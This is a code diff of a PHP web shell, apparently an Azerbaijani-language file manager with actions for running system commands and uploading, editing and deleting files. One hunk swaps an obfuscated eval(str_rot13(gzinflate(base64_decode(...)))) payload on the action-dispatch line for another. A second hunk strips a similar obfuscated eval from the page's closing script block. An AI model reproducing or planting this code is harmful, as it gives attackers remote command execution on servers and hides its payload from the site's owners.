@@ -3,7 +3,7 @@ session_start();
 $baqliFunksiyalar = explode(",", "");
 $safeMode = true;
 $actions = array("esas","fayl_oxu","phpinfo","sistem_kom","fayl_redakte","fayl_yukle",'fayl_sil','fayl_yarat','papka_yarat','fayl_sifirla' , 'papka_sil','fayl_ad_deyish', 'ziple' , 'skl' , 'skl_d_t' , 'skl_d', 'fayl_upl');
-$ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas"; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
+$ne = isset($_POST['ne']) && in_array($_POST['ne'],$actions) ? $_POST['ne'] : "esas"; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
 
 
 
@@ -981,7 +981,7 @@ document.getElementById("emr_et_atash").addEventListener("keyup", function(event
     {
         sistemKom();
     }
-}); eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvS0yxa6W2h7KcVQDxUJJo2TuourcJXGX1/XLHmhuSQzj2wzGYcrEArIjjgszZOXPCmoudnT61RBWBISe3CH//Fun3ErvpMkfz7mdsaOyTstt9YwdnHfCKzjFWAFtVhUAERiolXzLwxHpWz3E8Zk3OBy5DW0T4Qdn6MaQz/IQ4yC+nF1aI0+qU5vOxvVdkQuEaBbS3E5q5aS3SMxsclu26Ok5Jq238wEAZwFYcjSVEJdCxOvokbQNFowYzkHV3esOt5wYvtqz4ww8t5r6G6fc/QPvP157X0dgl3UpHv2qUOe3YKa5a7UMe/SM9WlYpWet/0F')))));
+}); 
 </script>
 </body>
 </html>
